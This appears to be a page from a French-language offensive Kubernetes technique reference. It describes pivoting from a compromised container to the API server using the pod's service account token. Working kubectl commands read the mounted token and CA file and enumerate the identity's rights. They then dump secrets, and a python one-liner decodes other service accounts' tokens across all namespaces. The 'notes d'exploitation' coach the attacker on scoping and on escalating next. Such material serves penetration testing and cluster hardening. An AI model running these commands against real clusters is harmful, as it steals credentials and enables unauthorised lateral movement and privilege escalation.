---
title: "Jeton de compte de service vers l'API : agir sur le cluster avec une identité de pod"
order: 4
description: "Le jeton de compte de service d'un pod s'authentifie auprès de l'API server. L'attaquant énumère précisément ce que cette identité peut faire avec SelfSubjectRulesReview, puis l'exerce : lire des secrets, lister des workloads ou utiliser un verbe d'escalade. C'est le pivot d'un point d'appui dans un conteneur vers l'action contre le plan de contrôle du cluster sous l'identité du pod."
keywords:
  - service account token
  - api server
  - bearer token
  - can-i
  - lateral movement
---

# Jeton de compte de service vers l'API

Le jeton monté dans chaque pod est un identifiant bearer pour l'API server, et l'utiliser est le premier pas latéral d'un point d'appui dans un conteneur vers le plan de contrôle. Le mouvement consiste à s'authentifier avec le jeton, à énumérer précisément les droits de l'identité, puis à exercer tout ce que ces droits permettent, qu'il s'agisse de lire des secrets, de lister des workloads pour planifier la suite du déplacement, ou d'invoquer un verbe d'escalade.

```bash
APISERVER=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
C=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
# what can this identity do?
kubectl --token="$T" --certificate-authority="$C" --server="$APISERVER" auth can-i --list
# exercise it: read secrets in a namespace the token can reach
kubectl --token="$T" --certificate-authority="$C" --server="$APISERVER" \
  -n <ns> get secrets -o yaml
```

## Transformer des droits en mouvement

```bash
# list workloads to map targets and find more tokens
kubectl --token="$T" ... get pods,deploy,sa -A
# if the identity can read secrets, harvest tokens for other identities
kubectl --token="$T" ... get secrets -A -o json | \
  python3 -c 'import sys,json,base64;[print(base64.b64decode(s["data"]["token"]).decode()[:50]) for s in json.load(sys.stdin)["items"] if s.get("data",{}).get("token")]'
```

## Notes d'exploitation

- `auth can-i --list` d'abord, toujours : il définit la portée de l'identité et vous indique laquelle des options (lire des secrets, créer des pods ou un verbe d'escalade) est disponible, de sorte que vous ne gaspillez pas de tentatives.
- Un compte de service par défaut sans aucune liaison peut tout de même réaliser de la découverte du cluster (lister certaines ressources) dans beaucoup de clusters ; même cela cartographie des cibles pour le mouvement suivant.
- Lorsque les droits incluent un verbe d'escalade, poursuivez dans le groupe [Escalade de privilèges RBAC](../rbac-privilege-escalation/index.md) plutôt que de vous déplacer uniquement de côté.

## Références

- [Kubernetes : s'authentifier avec des jetons de compte de service](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#service-account-tokens)
- [Kubernetes : SelfSubjectRulesReview](https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/self-subject-rules-review-v1/)
